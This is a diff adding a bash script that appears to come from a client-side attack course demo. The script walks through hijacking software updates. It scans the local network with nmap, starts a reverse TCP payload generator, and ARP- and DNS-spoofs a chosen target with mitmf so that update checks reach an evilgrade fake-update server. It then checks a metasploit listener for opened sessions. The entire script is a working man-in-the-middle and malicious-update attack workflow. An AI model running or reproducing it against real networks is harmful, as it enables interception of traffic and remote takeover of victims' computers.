@@ -1,0 +1,32 @@
+#!/bin/bash
+
+echo "~~Steps to follow :
+		1-MOdify the mitmf configuration file by adding an A record as follow : [software Host website]=10.0.2.15.
+		2-A MITM attack will be started.
+		3-Execute the 'start' command in 'eveilgrade'.
+		4-GO to the target device, and check for updates using the software selected earlier.
+		5-INstall the updates.
+		6-Check metasploit listener for opened sessions."
+leafpad /etc/mitmf/mitmf.conf 
+echo "Configuration file modified"
+echo ~~Listing network interfaces \"ifconfig\"
+ifconfig
+read -p "~~Enter the network interface name that will be used: " interfaceName
+echo $interfaceName selected
+echo ~~Getting the network default gateway \"ip route | grep default\"
+defGateway=`ip route | grep default | awk  '{print $3}'`
+echo "~~Scanning for connected devices \"nmap -sn $defGateway/24\""
+nmap -sn $defGateway/24
+read -p "~~Enter target device IP: " ClientIP
+cd
+cd Desktop/Scripts/Demo-4-Client-Side-Attacks/
+gnome-terminal --tab -e './rev_tcp_generator'
+mitmf --arp --spoof --gateway $defGateway --target $ClientIP -i $interfaceName --dns 
+
+
+
+
+
+
+
+
